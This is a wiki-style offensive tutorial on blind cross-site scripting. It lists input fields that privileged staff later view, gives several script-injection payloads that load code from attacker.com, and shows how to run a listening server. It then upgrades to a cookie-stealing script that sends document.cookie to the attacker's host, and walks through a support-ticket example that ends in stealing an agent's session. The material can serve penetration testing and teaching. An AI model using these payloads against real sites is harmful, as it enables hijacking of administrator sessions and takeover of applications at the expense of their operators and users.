---
title: Blind XSS
---

**Blind XSS** fires on a page you can't see — a support ticket viewed by an admin, user details in a backoffice panel, a logs viewer, an audit UI. You can't visually confirm execution the usual way, so the payload has to **call home** to prove it worked.

## Where Blind XSS Hides

Any input a privileged user will later view:

- Contact forms, feedback boxes
- Review/comment systems with moderation queues
- User profile fields (bio, website, phone)
- Support ticket subjects/bodies
- Form fields that end up in admin dashboards
- `User-Agent` header (if displayed in access logs UI)
- File upload filenames (if shown in admin file manager)

## Detection via Out-of-Band Callback

Two problems to solve:

1. **Which field is vulnerable?** — encode the field name into the callback URL
2. **Which payload works?** — try multiple patterns to find one that executes

### The Callback Trick

Point the payload's `src` or `fetch` at your server with the field name in the path:

```html
<script src="http://attacker.com/username"></script>
```

When your server logs a request for `/username`, you know the `username` field was vulnerable. Do this for every field:

```html
<script src="http://attacker.com/email"></script>     in email field
<script src="http://attacker.com/subject"></script>   in subject field
<script src="http://attacker.com/bio"></script>       in bio field
```

Wait, check which paths get hit — those are the vulnerable fields.

### Candidate Payloads to Try

Different injection contexts need different escapes. Try several:

```html
<script src=http://attacker.com/field></script>
'><script src=http://attacker.com/field></script>
"><script src=http://attacker.com/field></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://attacker.com/field\';document.body.appendChild(a)')
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//attacker.com/field");a.send();</script>
<script>$.getScript("http://attacker.com/field")</script>
```

The last one works when jQuery is loaded on the target page.

### Listener Setup

Minimal server to log requests:

```bash
mkdir /tmp/tmpserver && cd /tmp/tmpserver
sudo php -S 0.0.0.0:80
```

Or Python:

```bash
python3 -m http.server 80
```

Both log the path of every incoming request — telling you which fields fired.

## Smart Field Prioritization

Save time by skipping unlikely fields:

- **Email** — usually format-validated before storage, escaped before display
- **Password** — hashed immediately, never displayed
- **Numeric fields** — usually type-validated and cast
- **File uploads** (binary content) — not rendered as HTML

Focus on **free-text fields** — subjects, bodies, bios, descriptions, comments. These are the ones that typically reach admin views unescaped.

## Upgrading to Cookie Theft

Once you've found a working field + payload pair, replace the identification URL with a cookie-stealing script:

**script.js on your server:**

```javascript
new Image().src = 'http://attacker.com/log?c=' + document.cookie;
```

**Final delivery payload:**

```html
<script src="http://attacker.com/script.js"></script>
```

The admin's cookies arrive. Depending on their role, this may be a direct path to full application takeover — admin sessions are usually the highest-value cookies to steal.

## Timing

Blind XSS is often **asynchronous** — your payload may fire hours or days after submission, whenever a human happens to review the queue. Keep your listener running. Use a tool that notifies you on hit:

- **XSS Hunter** (hosted) — notifies, captures DOM/cookies/screenshot
- **Interactsh** — OOB platform with HTTP, DNS, SMTP captures
- **Burp Collaborator** (Pro) — built-in OOB server

## Real-World Example

You submit a support ticket with:

```
Subject: <script src="http://you.com/subject"></script>
Body: <script src="http://you.com/body"></script>
Name: <script src="http://you.com/name"></script>
```

Three days later, a support agent opens the ticket. Your server logs:

```
10.10.10.5 [200] /subject
10.10.10.5 [200] /body
```

Two vulnerable fields, confirmed. You replace both with cookie-stealers and submit a second ticket. Next time a support agent opens it, their session cookie lands on your server — potentially giving you access to the backoffice panel they use to review tickets.
